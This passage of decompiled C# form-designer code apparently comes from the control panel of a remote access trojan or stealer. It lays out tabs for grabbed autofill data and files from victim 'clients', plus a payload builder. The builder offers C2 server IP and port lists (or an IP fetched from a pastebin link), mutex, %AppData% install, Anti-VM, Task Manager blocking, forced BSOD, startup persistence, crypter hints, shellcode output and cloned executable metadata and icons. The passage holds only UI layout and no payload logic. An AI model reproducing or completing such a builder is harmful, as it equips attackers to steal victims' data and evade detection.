		this.gridControlAutofill.MenuManager = this.barManager1;
		this.gridControlAutofill.Name = "gridControlAutofill";
		this.gridControlAutofill.Size = new System.Drawing.Size(1136, 588);
		this.gridControlAutofill.TabIndex = 6;
		this.gridControlAutofill.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewAutofill });
		this.gridViewAutofill.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[2] { this.AutoFillNameColumn, this.AutofillValueColumn });
		this.gridViewAutofill.DetailHeight = 284;
		this.gridViewAutofill.GridControl = this.gridControlAutofill;
		this.gridViewAutofill.Name = "gridViewAutofill";
		this.gridViewAutofill.OptionsView.ShowGroupPanel = false;
		this.AutoFillNameColumn.Caption = "Name";
		this.AutoFillNameColumn.FieldName = "sName";
		this.AutoFillNameColumn.Name = "AutoFillNameColumn";
		this.AutoFillNameColumn.Visible = true;
		this.AutoFillNameColumn.VisibleIndex = 0;
		this.AutofillValueColumn.Caption = "Value";
		this.AutofillValueColumn.FieldName = "sValue";
		this.AutofillValueColumn.Name = "AutofillValueColumn";
		this.AutofillValueColumn.Visible = true;
		this.AutofillValueColumn.VisibleIndex = 1;
		this.xtraTabPage5.Controls.Add(this.splitContainer2);
		this.xtraTabPage5.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("xtraTabPage5.ImageOptions.Image");
		this.xtraTabPage5.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage5.Name = "xtraTabPage5";
		this.xtraTabPage5.Size = new System.Drawing.Size(1430, 623);
		this.xtraTabPage5.Text = "File Grabber";
		this.splitContainer2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.splitContainer2.IsSplitterFixed = true;
		this.splitContainer2.Location = new System.Drawing.Point(0, 0);
		this.splitContainer2.Name = "splitContainer2";
		this.splitContainer2.Panel1.Controls.Add(this.listViewGrabClients);
		this.splitContainer2.Panel2.Controls.Add(this.gridControlGraber);
		this.splitContainer2.Size = new System.Drawing.Size(1430, 623);
		this.splitContainer2.SplitterDistance = 369;
		this.splitContainer2.TabIndex = 1;
		this.listViewGrabClients.Dock = System.Windows.Forms.DockStyle.Fill;
		this.listViewGrabClients.Location = new System.Drawing.Point(0, 0);
		this.listViewGrabClients.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.listViewGrabClients.Name = "listViewGrabClients";
		this.listViewGrabClients.Size = new System.Drawing.Size(369, 623);
		this.listViewGrabClients.TabIndex = 1;
		this.listViewGrabClients.SelectedIndexChanged += new System.EventHandler(listViewGrabClients_SelectedIndexChanged);
		this.listViewGrabClients.DoubleClick += new System.EventHandler(listGrabViewClients_DoubleClick);
		this.gridControlGraber.Dock = System.Windows.Forms.DockStyle.Fill;
		this.gridControlGraber.EmbeddedNavigator.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlGraber.Location = new System.Drawing.Point(0, 0);
		this.gridControlGraber.MainView = this.gridViewGraber;
		this.gridControlGraber.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.gridControlGraber.MenuManager = this.barManager1;
		this.gridControlGraber.Name = "gridControlGraber";
		this.gridControlGraber.Size = new System.Drawing.Size(1057, 623);
		this.gridControlGraber.TabIndex = 1;
		this.gridControlGraber.ViewCollection.AddRange(new DevExpress.XtraGrid.Views.Base.BaseView[1] { this.gridViewGraber });
		this.gridViewGraber.Columns.AddRange(new DevExpress.XtraGrid.Columns.GridColumn[2] { this.GraberCategoryColumn, this.GraberValueColumn });
		this.gridViewGraber.DetailHeight = 284;
		this.gridViewGraber.GridControl = this.gridControlGraber;
		this.gridViewGraber.Name = "gridViewGraber";
		this.gridViewGraber.OptionsView.ShowGroupPanel = false;
		this.GraberCategoryColumn.Caption = "Category";
		this.GraberCategoryColumn.FieldName = "category";
		this.GraberCategoryColumn.Name = "GraberCategoryColumn";
		this.GraberCategoryColumn.Visible = true;
		this.GraberCategoryColumn.VisibleIndex = 0;
		this.GraberValueColumn.Caption = "Value";
		this.GraberValueColumn.FieldName = "value";
		this.GraberValueColumn.Name = "GraberValueColumn";
		this.GraberValueColumn.Visible = true;
		this.GraberValueColumn.VisibleIndex = 1;
		this.xtraTabPage6.Controls.Add(this.xtraScrollableControl1);
		this.xtraTabPage6.ImageOptions.Image = (System.Drawing.Image)resources.GetObject("xtraTabPage6.ImageOptions.Image");
		this.xtraTabPage6.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraTabPage6.Name = "xtraTabPage6";
		this.xtraTabPage6.Size = new System.Drawing.Size(1430, 623);
		this.xtraTabPage6.Text = "Builder Settings";
		this.xtraScrollableControl1.Controls.Add(this.xtraTabControl3);
		this.xtraScrollableControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.xtraScrollableControl1.Location = new System.Drawing.Point(0, 0);
		this.xtraScrollableControl1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.xtraScrollableControl1.Name = "xtraScrollableControl1";
		this.xtraScrollableControl1.Size = new System.Drawing.Size(1430, 623);
		this.xtraScrollableControl1.TabIndex = 0;
		this.xtraTabControl3.Location = new System.Drawing.Point(33, 25);
		this.xtraTabControl3.MultiLine = DevExpress.Utils.DefaultBoolean.True;
		this.xtraTabControl3.Name = "xtraTabControl3";
		this.xtraTabControl3.SelectedTabPage = this.xtraTabPage13;
		this.xtraTabControl3.Size = new System.Drawing.Size(1365, 574);
		this.xtraTabControl3.TabIndex = 136;
		this.xtraTabControl3.TabPages.AddRange(new DevExpress.XtraTab.XtraTabPage[1] { this.xtraTabPage13 });
		this.xtraTabPage13.Controls.Add(this.groupControl1);
		this.xtraTabPage13.Controls.Add(this.groupControl4);
		this.xtraTabPage13.Controls.Add(this.groupControl2);
		this.xtraTabPage13.Controls.Add(this.groupControl3);
		this.xtraTabPage13.Name = "xtraTabPage13";
		this.xtraTabPage13.Size = new System.Drawing.Size(1363, 543);
		this.groupControl1.CaptionImageOptions.Image = (System.Drawing.Image)resources.GetObject("groupControl1.CaptionImageOptions.Image");
		this.groupControl1.CaptionLocation = DevExpress.Utils.Locations.Top;
		this.groupControl1.Controls.Add(this.listBoxIP);
		this.groupControl1.Controls.Add(this.txtPaste_bin);
		this.groupControl1.Controls.Add(this.chkPaste_bin);
		this.groupControl1.Controls.Add(this.btnAddIP);
		this.groupControl1.Controls.Add(this.textIP);
		this.groupControl1.Controls.Add(this.btnRemoveIP);
		this.groupControl1.GroupStyle = DevExpress.Utils.GroupStyle.Light;
		this.groupControl1.Location = new System.Drawing.Point(34, 3);
		this.groupControl1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.groupControl1.Name = "groupControl1";
		this.groupControl1.Size = new System.Drawing.Size(332, 290);
		this.groupControl1.TabIndex = 132;
		this.groupControl1.Text = "Server IP";
		this.listBoxIP.Location = new System.Drawing.Point(14, 79);
		this.listBoxIP.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.listBoxIP.Name = "listBoxIP";
		this.listBoxIP.Size = new System.Drawing.Size(304, 141);
		this.listBoxIP.TabIndex = 133;
		this.txtPaste_bin.Location = new System.Drawing.Point(14, 250);
		this.txtPaste_bin.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtPaste_bin.MenuManager = this.barManager1;
		this.txtPaste_bin.Name = "txtPaste_bin";
		this.txtPaste_bin.Size = new System.Drawing.Size(304, 28);
		this.txtPaste_bin.TabIndex = 132;
		this.chkPaste_bin.Location = new System.Drawing.Point(14, 226);
		this.chkPaste_bin.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.chkPaste_bin.Name = "chkPaste_bin";
		this.chkPaste_bin.Properties.Caption = "Get IP By link";
		this.chkPaste_bin.Size = new System.Drawing.Size(110, 22);
		this.chkPaste_bin.TabIndex = 130;
		this.btnAddIP.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleCenter;
		this.btnAddIP.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("btnAddIP.ImageOptions.SvgImage");
		this.btnAddIP.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.CommonPalette;
		this.btnAddIP.ImageOptions.SvgImageSize = new System.Drawing.Size(25, 25);
		this.btnAddIP.Location = new System.Drawing.Point(251, 39);
		this.btnAddIP.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnAddIP.Name = "btnAddIP";
		this.btnAddIP.Size = new System.Drawing.Size(26, 24);
		this.btnAddIP.TabIndex = 121;
		this.btnAddIP.Text = "OK";
		this.btnAddIP.Click += new System.EventHandler(BtnAddIP_Click);
		this.textIP.EditValue = "127.0.0.1";
		this.textIP.Location = new System.Drawing.Point(15, 39);
		this.textIP.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.textIP.Name = "textIP";
		this.textIP.Properties.BeepOnError = true;
		this.textIP.Properties.MaskSettings.Set("MaskManagerType", typeof(DevExpress.Data.Mask.RegExpMaskManager));
		this.textIP.Properties.MaskSettings.Set("mask", "(([01]?[0-9]?[0-9])|(2[0-4][0-9])|(25[0-5]))\\.(([01]?[0-9]?[0-9])|(2[0-4][0-9])|(25[0-5]))\\.(([01]?[0-9]?[0-9])|(2[0-4][0-9])|(25[0-5]))\\.(([01]?[0-9]?[0-9])|(2[0-4][0-9])|(25[0-5]))");
		this.textIP.Size = new System.Drawing.Size(230, 28);
		toolTipItem2.AllowHtmlText = DevExpress.Utils.DefaultBoolean.True;
		toolTipItem2.Text = "<b>The IP \"127.0.0.1\" it works only for locally.</b>";
		superToolTip2.Items.Add(toolTipItem2);
		this.textIP.SuperTip = superToolTip2;
		this.textIP.TabIndex = 126;
		this.btnRemoveIP.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleCenter;
		this.btnRemoveIP.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("btnRemoveIP.ImageOptions.SvgImage");
		this.btnRemoveIP.ImageOptions.SvgImageSize = new System.Drawing.Size(25, 25);
		this.btnRemoveIP.Location = new System.Drawing.Point(283, 39);
		this.btnRemoveIP.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnRemoveIP.Name = "btnRemoveIP";
		this.btnRemoveIP.Size = new System.Drawing.Size(26, 24);
		this.btnRemoveIP.TabIndex = 122;
		this.btnRemoveIP.Text = "OK";
		this.btnRemoveIP.Click += new System.EventHandler(BtnRemoveIP_Click);
		this.groupControl4.CaptionImageOptions.Image = (System.Drawing.Image)resources.GetObject("groupControl4.CaptionImageOptions.Image");
		this.groupControl4.CaptionLocation = DevExpress.Utils.Locations.Top;
		this.groupControl4.Controls.Add(this.label4);
		this.groupControl4.Controls.Add(this.label3);
		this.groupControl4.Controls.Add(this.comboBoxFolder);
		this.groupControl4.Controls.Add(this.numDelay);
		this.groupControl4.Controls.Add(this.txtMutex);
		this.groupControl4.Controls.Add(this.txtGroup);
		this.groupControl4.Controls.Add(this.label17);
		this.groupControl4.Controls.Add(this.textFilename);
		this.groupControl4.Controls.Add(this.chkAntiProcess);
		this.groupControl4.Controls.Add(this.label2);
		this.groupControl4.Controls.Add(this.chkAnti);
		this.groupControl4.Controls.Add(this.btnShellcode);
		this.groupControl4.Controls.Add(this.btnBuild);
		this.groupControl4.Controls.Add(this.label5);
		this.groupControl4.Controls.Add(this.chkBsod);
		this.groupControl4.Controls.Add(this.checkBox1);
		this.groupControl4.Controls.Add(this.label6);
		this.groupControl4.Controls.Add(this.label16);
		this.groupControl4.Controls.Add(this.radioGroupArchitecture);
		this.groupControl4.GroupStyle = DevExpress.Utils.GroupStyle.Light;
		this.groupControl4.Location = new System.Drawing.Point(34, 299);
		this.groupControl4.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.groupControl4.Name = "groupControl4";
		this.groupControl4.Size = new System.Drawing.Size(641, 231);
		this.groupControl4.TabIndex = 134;
		this.groupControl4.Text = "Options";
		this.label4.AutoSize = true;
		this.label4.Location = new System.Drawing.Point(355, 202);
		this.label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label4.Name = "label4";
		this.label4.Size = new System.Drawing.Size(25, 13);
		this.label4.TabIndex = 145;
		this.label4.Text = "x64";
		this.label3.AutoSize = true;
		this.label3.Location = new System.Drawing.Point(202, 202);
		this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label3.Name = "label3";
		this.label3.Size = new System.Drawing.Size(25, 13);
		this.label3.TabIndex = 144;
		this.label3.Text = "x86";
		this.comboBoxFolder.EditValue = "%AppData%";
		this.comboBoxFolder.Location = new System.Drawing.Point(376, 116);
		this.comboBoxFolder.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.comboBoxFolder.MenuManager = this.barManager1;
		this.comboBoxFolder.Name = "comboBoxFolder";
		this.comboBoxFolder.Properties.Buttons.AddRange(new DevExpress.XtraEditors.Controls.EditorButton[1]
		{
			new DevExpress.XtraEditors.Controls.EditorButton(DevExpress.XtraEditors.Controls.ButtonPredefines.Combo)
		});
		this.comboBoxFolder.Properties.Items.AddRange(new object[2] { "%AppData%", "%Temp%" });
		this.comboBoxFolder.Size = new System.Drawing.Size(257, 28);
		this.comboBoxFolder.TabIndex = 136;
		this.numDelay.EditValue = new decimal(new int[4] { 1, 0, 0, 0 });
		this.numDelay.Location = new System.Drawing.Point(376, 153);
		this.numDelay.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.numDelay.MenuManager = this.barManager1;
		this.numDelay.Name = "numDelay";
		this.numDelay.Properties.Buttons.AddRange(new DevExpress.XtraEditors.Controls.EditorButton[1]
		{
			new DevExpress.XtraEditors.Controls.EditorButton(DevExpress.XtraEditors.Controls.ButtonPredefines.Combo)
		});
		this.numDelay.Size = new System.Drawing.Size(102, 28);
		this.numDelay.TabIndex = 136;
		this.txtMutex.Location = new System.Drawing.Point(16, 118);
		this.txtMutex.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtMutex.MenuManager = this.barManager1;
		this.txtMutex.Name = "txtMutex";
		this.txtMutex.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtMutex.Properties.Appearance.Options.UseFont = true;
		this.txtMutex.Size = new System.Drawing.Size(229, 28);
		this.txtMutex.TabIndex = 142;
		this.txtGroup.EditValue = "Default";
		this.txtGroup.Location = new System.Drawing.Point(16, 61);
		this.txtGroup.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtGroup.MenuManager = this.barManager1;
		this.txtGroup.Name = "txtGroup";
		this.txtGroup.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtGroup.Properties.Appearance.Options.UseFont = true;
		this.txtGroup.Size = new System.Drawing.Size(163, 28);
		this.txtGroup.TabIndex = 141;
		this.label17.AutoSize = true;
		this.label17.Location = new System.Drawing.Point(13, 39);
		this.label17.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label17.Name = "label17";
		this.label17.Size = new System.Drawing.Size(66, 13);
		this.label17.TabIndex = 109;
		this.label17.Text = "Group Name";
		this.textFilename.Location = new System.Drawing.Point(376, 82);
		this.textFilename.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.textFilename.MenuManager = this.barManager1;
		this.textFilename.Name = "textFilename";
		this.textFilename.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.textFilename.Properties.Appearance.Options.UseFont = true;
		this.textFilename.Size = new System.Drawing.Size(257, 28);
		this.textFilename.TabIndex = 140;
		this.chkAntiProcess.Location = new System.Drawing.Point(123, 156);
		this.chkAntiProcess.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.chkAntiProcess.Name = "chkAntiProcess";
		this.chkAntiProcess.Properties.Caption = "Block Task Manager";
		this.chkAntiProcess.Size = new System.Drawing.Size(124, 22);
		this.chkAntiProcess.TabIndex = 134;
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(48, 202);
		this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(49, 13);
		this.label2.TabIndex = 98;
		this.label2.Text = "Any CPU";
		this.chkAnti.Location = new System.Drawing.Point(16, 156);
		this.chkAnti.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.chkAnti.Name = "chkAnti";
		this.chkAnti.Properties.Caption = "Anti-VM";
		this.chkAnti.Size = new System.Drawing.Size(65, 22);
		this.chkAnti.TabIndex = 133;
		this.btnShellcode.ImageOptions.ImageToTextAlignment = DevExpress.XtraEditors.ImageAlignToText.LeftCenter;
		this.btnShellcode.ImageOptions.ImageToTextIndent = 10;
		this.btnShellcode.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("btnShellcode.ImageOptions.SvgImage");
		this.btnShellcode.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.Full;
		this.btnShellcode.ImageOptions.SvgImageSize = new System.Drawing.Size(20, 20);
		this.btnShellcode.Location = new System.Drawing.Point(484, 41);
		this.btnShellcode.Name = "btnShellcode";
		this.btnShellcode.Size = new System.Drawing.Size(147, 30);
		this.btnShellcode.TabIndex = 118;
		this.btnShellcode.Text = "Shellcode";
		this.btnShellcode.Click += new System.EventHandler(btnShellcode_Click);
		this.btnBuild.ImageOptions.ImageToTextAlignment = DevExpress.XtraEditors.ImageAlignToText.LeftCenter;
		this.btnBuild.ImageOptions.ImageToTextIndent = 10;
		this.btnBuild.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("btnBuild.ImageOptions.SvgImage");
		this.btnBuild.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.Full;
		this.btnBuild.ImageOptions.SvgImageSize = new System.Drawing.Size(20, 20);
		this.btnBuild.Location = new System.Drawing.Point(484, 193);
		this.btnBuild.Name = "btnBuild";
		this.btnBuild.Size = new System.Drawing.Size(149, 30);
		this.btnBuild.TabIndex = 119;
		this.btnBuild.Text = "Build";
		this.btnBuild.Click += new System.EventHandler(BtnBuild_Click);
		this.label5.AutoSize = true;
		this.label5.Location = new System.Drawing.Point(319, 124);
		this.label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label5.Name = "label5";
		this.label5.Size = new System.Drawing.Size(48, 13);
		this.label5.TabIndex = 97;
		this.label5.Text = "File path";
		this.chkBsod.Location = new System.Drawing.Point(192, 65);
		this.chkBsod.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.chkBsod.Name = "chkBsod";
		this.chkBsod.Properties.Caption = "BSOD";
		this.chkBsod.Size = new System.Drawing.Size(70, 22);
		this.chkBsod.TabIndex = 132;
		this.checkBox1.Location = new System.Drawing.Point(376, 49);
		this.checkBox1.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.checkBox1.Name = "checkBox1";
		this.checkBox1.Properties.Caption = "Enable Startup";
		this.checkBox1.Size = new System.Drawing.Size(102, 22);
		toolTipItem3.AllowHtmlText = DevExpress.Utils.DefaultBoolean.True;
		toolTipItem3.Text = "<b>Don't enable \"Startup\" if you will use a Crypter.</b>";
		superToolTip3.Items.Add(toolTipItem3);
		this.checkBox1.SuperTip = superToolTip3;
		this.checkBox1.TabIndex = 131;
		this.label6.AutoSize = true;
		this.label6.Location = new System.Drawing.Point(13, 97);
		this.label6.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label6.Name = "label6";
		this.label6.Size = new System.Drawing.Size(37, 13);
		this.label6.TabIndex = 103;
		this.label6.Text = "Mutex";
		this.label16.AutoSize = true;
		this.label16.Location = new System.Drawing.Point(318, 161);
		this.label16.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label16.Name = "label16";
		this.label16.Size = new System.Drawing.Size(49, 13);
		this.label16.TabIndex = 107;
		this.label16.Text = "Sleep (s)";
		this.radioGroupArchitecture.EditValue = 0;
		this.radioGroupArchitecture.Location = new System.Drawing.Point(15, 193);
		this.radioGroupArchitecture.MenuManager = this.barManager1;
		this.radioGroupArchitecture.Name = "radioGroupArchitecture";
		this.radioGroupArchitecture.Properties.BorderStyle = DevExpress.XtraEditors.Controls.BorderStyles.NoBorder;
		this.radioGroupArchitecture.Properties.Columns = 3;
		this.radioGroupArchitecture.Properties.Items.AddRange(new DevExpress.XtraEditors.Controls.RadioGroupItem[3]
		{
			new DevExpress.XtraEditors.Controls.RadioGroupItem(0, ""),
			new DevExpress.XtraEditors.Controls.RadioGroupItem(86, ""),
			new DevExpress.XtraEditors.Controls.RadioGroupItem(64, "")
		});
		this.radioGroupArchitecture.Size = new System.Drawing.Size(463, 30);
		this.radioGroupArchitecture.TabIndex = 143;
		this.groupControl2.CaptionImageOptions.Image = (System.Drawing.Image)resources.GetObject("groupControl2.CaptionImageOptions.Image");
		this.groupControl2.CaptionLocation = DevExpress.Utils.Locations.Top;
		this.groupControl2.Controls.Add(this.listBoxPort);
		this.groupControl2.Controls.Add(this.textPort);
		this.groupControl2.Controls.Add(this.btnAddPort);
		this.groupControl2.Controls.Add(this.btnRemovePort);
		this.groupControl2.GroupStyle = DevExpress.Utils.GroupStyle.Light;
		this.groupControl2.Location = new System.Drawing.Point(372, 3);
		this.groupControl2.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.groupControl2.Name = "groupControl2";
		this.groupControl2.Size = new System.Drawing.Size(303, 290);
		this.groupControl2.TabIndex = 133;
		this.groupControl2.Text = "Server Port";
		this.listBoxPort.Location = new System.Drawing.Point(11, 79);
		this.listBoxPort.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.listBoxPort.Name = "listBoxPort";
		this.listBoxPort.Size = new System.Drawing.Size(282, 141);
		this.listBoxPort.TabIndex = 126;
		this.textPort.EditValue = new decimal(new int[4]);
		this.textPort.Location = new System.Drawing.Point(11, 40);
		this.textPort.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.textPort.Name = "textPort";
		this.textPort.Properties.BeepOnError = true;
		this.textPort.Properties.Buttons.AddRange(new DevExpress.XtraEditors.Controls.EditorButton[1]
		{
			new DevExpress.XtraEditors.Controls.EditorButton(DevExpress.XtraEditors.Controls.ButtonPredefines.Combo)
		});
		this.textPort.Properties.EditValueChangedFiringMode = DevExpress.XtraEditors.Controls.EditValueChangedFiringMode.Default;
		this.textPort.Properties.MaskSettings.Set("MaskManagerType", typeof(DevExpress.Data.Mask.NumericMaskManager));
		this.textPort.Properties.MaskSettings.Set("MaskManagerSignature", "allowNull=False");
		this.textPort.Properties.MaskSettings.Set("mask", "d");
		this.textPort.Size = new System.Drawing.Size(214, 28);
		this.textPort.TabIndex = 125;
		this.btnAddPort.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleCenter;
		this.btnAddPort.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("btnAddPort.ImageOptions.SvgImage");
		this.btnAddPort.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.CommonPalette;
		this.btnAddPort.ImageOptions.SvgImageSize = new System.Drawing.Size(25, 25);
		this.btnAddPort.Location = new System.Drawing.Point(231, 40);
		this.btnAddPort.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnAddPort.Name = "btnAddPort";
		this.btnAddPort.Size = new System.Drawing.Size(26, 24);
		this.btnAddPort.TabIndex = 123;
		this.btnAddPort.Text = "OK";
		this.btnAddPort.Click += new System.EventHandler(BtnAddPort_Click);
		this.btnRemovePort.ImageOptions.Location = DevExpress.XtraEditors.ImageLocation.MiddleCenter;
		this.btnRemovePort.ImageOptions.SvgImage = (DevExpress.Utils.Svg.SvgImage)resources.GetObject("btnRemovePort.ImageOptions.SvgImage");
		this.btnRemovePort.ImageOptions.SvgImageSize = new System.Drawing.Size(25, 25);
		this.btnRemovePort.Location = new System.Drawing.Point(263, 40);
		this.btnRemovePort.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.btnRemovePort.Name = "btnRemovePort";
		this.btnRemovePort.Size = new System.Drawing.Size(26, 24);
		this.btnRemovePort.TabIndex = 124;
		this.btnRemovePort.Text = "OK";
		this.btnRemovePort.Click += new System.EventHandler(BtnRemovePort_Click);
		this.groupControl3.CaptionImageOptions.Image = (System.Drawing.Image)resources.GetObject("groupControl3.CaptionImageOptions.Image");
		this.groupControl3.CaptionLocation = DevExpress.Utils.Locations.Top;
		this.groupControl3.Controls.Add(this.txtFileVersion);
		this.groupControl3.Controls.Add(this.txtProductVersion);
		this.groupControl3.Controls.Add(this.txtOriginalFilename);
		this.groupControl3.Controls.Add(this.txtTrademarks);
		this.groupControl3.Controls.Add(this.txtCopyright);
		this.groupControl3.Controls.Add(this.txtProduct);
		this.groupControl3.Controls.Add(this.txtIcon);
		this.groupControl3.Controls.Add(this.txtCompany);
		this.groupControl3.Controls.Add(this.chkIcon);
		this.groupControl3.Controls.Add(this.txtDescription);
		this.groupControl3.Controls.Add(this.label8);
		this.groupControl3.Controls.Add(this.btnAssembly);
		this.groupControl3.Controls.Add(this.label7);
		this.groupControl3.Controls.Add(this.label9);
		this.groupControl3.Controls.Add(this.btnIcon);
		this.groupControl3.Controls.Add(this.label10);
		this.groupControl3.Controls.Add(this.label11);
		this.groupControl3.Controls.Add(this.label12);
		this.groupControl3.Controls.Add(this.btnClone);
		this.groupControl3.Controls.Add(this.label13);
		this.groupControl3.Controls.Add(this.label14);
		this.groupControl3.Controls.Add(this.picIcon);
		this.groupControl3.GroupStyle = DevExpress.Utils.GroupStyle.Light;
		this.groupControl3.Location = new System.Drawing.Point(694, 3);
		this.groupControl3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.groupControl3.Name = "groupControl3";
		this.groupControl3.Size = new System.Drawing.Size(632, 527);
		this.groupControl3.TabIndex = 135;
		this.groupControl3.Text = "Exe Information";
		this.txtFileVersion.EditValue = "1.0.0.0";
		this.txtFileVersion.Enabled = false;
		this.txtFileVersion.Location = new System.Drawing.Point(145, 466);
		this.txtFileVersion.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtFileVersion.MenuManager = this.barManager1;
		this.txtFileVersion.Name = "txtFileVersion";
		this.txtFileVersion.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtFileVersion.Properties.Appearance.Options.UseFont = true;
		this.txtFileVersion.Size = new System.Drawing.Size(467, 28);
		this.txtFileVersion.TabIndex = 139;
		this.txtProductVersion.EditValue = "1.0.0.0";
		this.txtProductVersion.Enabled = false;
		this.txtProductVersion.Location = new System.Drawing.Point(145, 433);
		this.txtProductVersion.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtProductVersion.MenuManager = this.barManager1;
		this.txtProductVersion.Name = "txtProductVersion";
		this.txtProductVersion.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtProductVersion.Properties.Appearance.Options.UseFont = true;
		this.txtProductVersion.Size = new System.Drawing.Size(467, 28);
		this.txtProductVersion.TabIndex = 138;
		this.txtOriginalFilename.Enabled = false;
		this.txtOriginalFilename.Location = new System.Drawing.Point(145, 400);
		this.txtOriginalFilename.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtOriginalFilename.MenuManager = this.barManager1;
		this.txtOriginalFilename.Name = "txtOriginalFilename";
		this.txtOriginalFilename.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtOriginalFilename.Properties.Appearance.Options.UseFont = true;
		this.txtOriginalFilename.Size = new System.Drawing.Size(467, 28);
		this.txtOriginalFilename.TabIndex = 137;
		this.txtTrademarks.Enabled = false;
		this.txtTrademarks.Location = new System.Drawing.Point(145, 367);
		this.txtTrademarks.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtTrademarks.MenuManager = this.barManager1;
		this.txtTrademarks.Name = "txtTrademarks";
		this.txtTrademarks.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtTrademarks.Properties.Appearance.Options.UseFont = true;
		this.txtTrademarks.Size = new System.Drawing.Size(467, 28);
		this.txtTrademarks.TabIndex = 134;
		this.txtCopyright.Enabled = false;
		this.txtCopyright.Location = new System.Drawing.Point(145, 334);
		this.txtCopyright.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtCopyright.MenuManager = this.barManager1;
		this.txtCopyright.Name = "txtCopyright";
		this.txtCopyright.Properties.Appearance.Font = new System.Drawing.Font("Tahoma", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		this.txtCopyright.Properties.Appearance.Options.UseFont = true;
		this.txtCopyright.Size = new System.Drawing.Size(467, 28);
		this.txtCopyright.TabIndex = 133;
		this.txtProduct.Enabled = false;
		this.txtProduct.Location = new System.Drawing.Point(145, 235);
		this.txtProduct.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
		this.txtProduct.MenuManager = this.barManager1;
		this.txtProduct.Name = "txtProduct";
